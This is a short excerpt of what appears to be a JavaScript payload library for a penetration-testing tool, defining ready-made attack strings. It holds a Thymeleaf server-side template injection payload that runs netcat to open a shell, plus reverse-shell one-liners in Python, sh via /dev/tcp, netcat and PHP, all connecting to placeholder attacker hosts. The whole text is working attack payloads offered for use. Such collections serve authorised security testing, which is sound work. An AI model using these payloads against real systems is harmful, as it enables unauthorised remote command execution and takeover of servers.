...
window.Payload.SSTI = {
  ...
  Java: {
    thymeleafRCE: () =>
      '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
...
window.Payload.Shell = {
  Python: {
    ...
    py: () =>
      'python -c \'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'',
  },
  sh: {
    withI: () => 'sh -i >& /dev/tcp/RHOST/RPORT 0>&1',
    withoutI: () =>
      '0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196',
  },
  nc: {
    withE: () => 'nc -e /bin/sh RHOST RPORT',
    withC: () => 'nc -c bash RHOST RPORT',
  },
  php: {
    reverseShell: () =>
      'php -r \'$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");\'',
